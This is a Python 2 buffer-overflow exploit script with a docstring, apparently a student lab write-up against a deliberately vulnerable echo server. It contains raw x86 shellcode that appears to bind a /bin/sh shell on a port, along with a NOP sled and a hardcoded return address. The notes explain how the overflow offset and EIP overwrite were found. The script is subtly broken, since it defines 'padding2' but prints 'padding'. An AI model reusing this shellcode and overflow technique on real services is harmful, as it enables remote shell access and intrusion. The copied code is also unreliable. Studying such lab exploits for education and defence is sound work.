#!/usr/bin/python 

buf =  ""
buf += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
buf += "\xcd\x80\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51"
buf += "\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04"
buf += "\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f"
buf += "\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f"
buf += "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

prefix = 'A' * (1036 - 200 - len(buf))
nopsled = '\x90' * 200
eip = '\xb1\xce\xff\xbf'
padding2 = 'X' * (1100 - 1036 -4)
      
print prefix + nopsled + buf + eip + padding


"""

NOTE: I WAS RUNNING ALL OF THIS IN A 32-BIT KALI LINUX VM
(except I got the shellcode from locally-installed msfvenom)

I downloaded example server code from
https://samsclass.info/127/proj/p4-server.c. I ran the server; it
just echoes messages from the client. main() uses a buffer that's
4096 bytes big, but copier() uses a buffer that 1024 bytes big for
strcpy(), so you can easily overflow copier's buffer.

If I enter 1100 A's to the server, it segfaults. This means that
somewhere between bytes 1024 and 1100, there's the eip register.
I can find it by entering a nonrepeating pattern of bytes in the
last 100 bytes of the exploit. When I do this, I find that the
return address is the equivalent of 1918, which means it's bytes 
1037 through 1040 in the buffer. 

I can now insert a custom return address at location 1037 in the
inputted string. To generate shellcode, I use the msfvenom
command to choose a helpful shellcode variant (the generated 
shellcode is in the buf variable above). I use gdb to find an
address in the middle of the NOP sled and use that address for
the eip. When I run the exploit, it opens a shell.

"""